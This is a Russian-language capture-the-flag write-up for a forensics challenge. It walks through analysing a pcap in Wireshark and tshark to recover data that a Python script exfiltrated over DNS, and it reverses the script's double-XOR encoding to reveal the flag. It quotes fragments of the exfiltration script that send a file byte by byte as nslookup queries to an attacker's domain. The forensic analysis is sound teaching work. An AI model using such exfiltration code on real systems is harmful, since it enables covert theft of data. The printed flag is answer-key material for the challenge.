# Scriptkidding

| Название | Сложность | Автор |
|------|-----|-------|
| Scriptkidding | Easy | @collapsz |

## Описание:

На днях ткнулся в какой-то тестовый сервер и стащил оттуда дешевые авиабилеты. Даже использовал кастомное шифрование. Просчитался? Но где?? 

## TLDR:

Зашифрованная DNS-эксфильтрация в сетевом трафике с известным алгоритмом шифрования 

---
## Решение:

В задании предоставлен дамп сетевого трафика, открываем его в Wireshark и анализируем. В глаза бросается HTTP GET на некий hdfgoa.py

![изображение](https://github.com/user-attachments/assets/0e891690-8bbf-4a94-8a3f-36bca9f527ba)

Посмотрим на его содержимое:

![изображение](https://github.com/user-attachments/assets/ff5c6419-474c-4a1f-a08e-381f759c9069)

Скрипт принимает на вход два аргумента – file и h. Читает файл:

```
try:
    with open('file', 'rb') as f:
        content = f.read()
```

Шифрует его при помощи двойного ксора и переводит в байты:

```
def xor(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

try:
    with open('file', 'rb') as f:
        content = f.read()
        enc = xor(xor(content, key1), key2)
        bytes_list = [hex(b)[2:].zfill(2) for b in enc]
```

Далее побайтово отправляет dns-запрос на поддомен *.hostname – классическая dns-эксфильтрация:

```
for byte in bytes_list:
            subprocess.run(['nslookup', '-type=TXT', f'{byte}.{hostname}'])
            subprocess.run(['sleep', '1'])
```

Нам известен алгоритм шифрования, поэтому после определения техники атаки остается лишь вытащить нужные данные и расшифровать их.  

Для того работы с pcap-файлом воспользуемся утилитой tshark. Для начала достанем из него все DNS-запросы:

```
tshark -r dns.pcap -Y "dns" -T fields -e dns.qry.name 
```

Из них подавляющее большинство летит на хост *.oastify.com – отсортируем их от всего остального:

```
tshark -r dns.pcap -Y "dns" -T fields -e dns.qry.name | grep -E '.*\.oastify\.com$'
```

Уже лучше. Теперь очистим дубликаты, отсечем домен верхнего уровня и соединим все воедино:

```
tshark -r dns.pcap -Y "dns" -T fields -e dns.qry.name | grep -E '.*\.oastify\.com$' | grep -o '^[^.]\+' | tr -d '\n'
```
Теперь, развернем алгоритм шифрования:

```
import sys

def xor(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def decode_hex(hex_str):
    try:
        encrypted_data = bytes.fromhex(hex_str)
        
        key1 = bytes.fromhex('1337')
        key2 = bytes.fromhex('DEADBEEF')
        
        decrypted = xor(xor(encrypted_data, key2), key1)
        
        return decrypted.decode('utf-8', errors='replace')
    
    except Exception as e:
        print(f"Decoding error: {str(e)}")
        return None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 decoder.py <hex_string>")
        sys.exit(1)    
    hex_input = sys.argv[1].strip()
    result = decode_hex(hex_input)
    flag_part = 'rdg{'
    if result:
        if flag_part in result: 
       	    print("[+] Flag found", result)
        else:
            print("[-] No flag found")
    else:
        print('Failed to decrypt')
```

И скормим ему нашу зашифрованную строку:

```
python3 decrypt.py $(tshark -r dns.pcap -Y "dns" -T fields -e dns.qry.name | grep -E '.*\.oastify\.com$' | grep -o '^[^.]\+' | tr -d '\n')
```
![изображение](https://github.com/user-attachments/assets/1f6d8e12-a48d-450b-bbf4-99d1d6b923a7)

## Flag:

rdg{d42c857ad179690d37ba7857f2b0ab54}
